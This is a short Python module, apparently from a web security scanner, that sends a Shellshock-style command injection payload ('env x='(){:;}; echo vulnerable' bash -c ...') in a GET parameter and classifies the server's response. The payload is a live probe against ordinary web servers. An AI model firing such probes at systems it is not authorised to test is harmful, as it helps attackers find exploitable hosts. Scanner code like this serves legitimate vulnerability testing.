import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_code(url, headers, pattern, success, fail, error):
    """
    命令注入攻击测试
    """
    # 定义命令注入攻击 payload
    data = {
        "cmd": '''env x='(){:;}; echo vulnerable' bash -c "test"'''
    }

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, headers, method='GET', params=data
    )
    
    # 处理响应
    return process_attack_response(
        "命令注入", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )